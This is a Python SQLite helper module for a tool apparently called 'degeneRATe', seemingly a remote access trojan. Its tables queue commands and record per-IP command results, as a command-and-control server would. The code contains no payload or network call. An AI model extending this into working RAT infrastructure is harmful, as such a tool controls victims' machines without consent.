import sqlite3
from loguru import logger


logger.remove()
logger.add("degeneRATe.log", format="{level} | {time} | {file}:{function}:{line} - {message}")


def create_table():
    conn = sqlite3.connect("degeneRATe.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS requests (ip text, command text, result text)")
    cursor.execute("CREATE TABLE IF NOT EXISTS commands (type text, command text)")
    conn.close()


def insert_commands(data: list):
    conn = sqlite3.connect("degeneRATe.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.executemany("INSERT INTO commands VALUES (?,?)", data)
    conn.commit()
    conn.close()


def find_commands():
    conn = sqlite3.connect("degeneRATe.db", check_same_thread=False)
    cursor = conn.cursor()
    info = cursor.execute(f'SELECT * FROM commands')
    commands = info.fetchall()
    conn.close()
    return commands


def delete_commands(command: str):
    conn = sqlite3.connect("degeneRATe.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM commands WHERE command = ?", (command,))
    conn.commit()
    conn.close()


def insert_request(data: list):
    conn = sqlite3.connect("degeneRATe.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.executemany("INSERT INTO requests VALUES (?,?,?)", data)
    conn.commit()
    conn.close()


create_table()
